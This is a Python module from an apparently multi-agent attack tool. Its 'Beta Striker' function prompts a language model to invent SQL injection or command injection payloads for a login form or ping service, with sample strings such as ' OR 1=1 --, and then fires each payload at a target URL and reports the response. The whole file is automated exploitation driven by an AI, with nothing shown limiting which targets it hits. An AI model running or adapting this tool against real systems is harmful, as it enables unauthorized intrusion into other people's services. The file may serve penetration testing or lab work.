from .llm_client import call_groq
from tools.http_exploit import fire_payload
from tracing import trace

@trace(name="Beta Striker")
async def run_beta(target_url, vuln_type, alpha_results, journal, broadcast_fn, trace_context=None) -> dict:
    from tracing import trace_step
    
    context = journal.get_context_string()
    recon_data = "\n".join(alpha_results)
    
    prompt = f"""You are Beta, the Striker agent.
TARGET ENDPOINT CONTEXT:
- Database: SQLite
- If {vuln_type} is 'sqli': You are attacking a LOGIN FORM (POST request). The payload is injected into the 'username' STRING field.
- If {vuln_type} is 'cmdi': You are attacking a PING SERVICE (POST request). The payload is injected into the 'host' field.

ATTACK JOURNAL (everything tried so far — do NOT repeat any of these):
{context}

RECON INTELLIGENCE:
{recon_data[:4000]}

Your task: Generate exactly ONE new, high-bypass SQLite payload to try for {vuln_type}.
For SQLi, use string-based bypasses like "' OR 1=1 --" or "' UNION SELECT 'admin','password' --".
Output ONLY the raw payload string."""

    messages = [
        {"role": "system", "content": prompt}
    ]
    
    await broadcast_fn("Analyzing intelligence and designing payload...", "Beta", "thinking")
    payload = await call_groq(messages)
    payload = payload.strip().strip('"').strip("'")
    
    await broadcast_fn(f"Firing payload → {payload}", "Beta", "info")
    
    if trace_context:
        span_id = trace_step(trace_context["workflow_id"], "HTTP_EXPLOIT", trace_context["parent_id"], {"payload": payload}, "running")
        response = await fire_payload(target_url, vuln_type, payload, {"workflow_id": trace_context["workflow_id"], "parent_id": span_id})
        trace_step(trace_context["workflow_id"], "HTTP_EXPLOIT", trace_context["parent_id"], {"status_code": response["status_code"]}, "success")
    else:
        response = await fire_payload(target_url, vuln_type, payload)
    
    await broadcast_fn(f"Response received — Status {response['status_code']}", "Beta", "info")
    return {"payload": payload, "response": response}
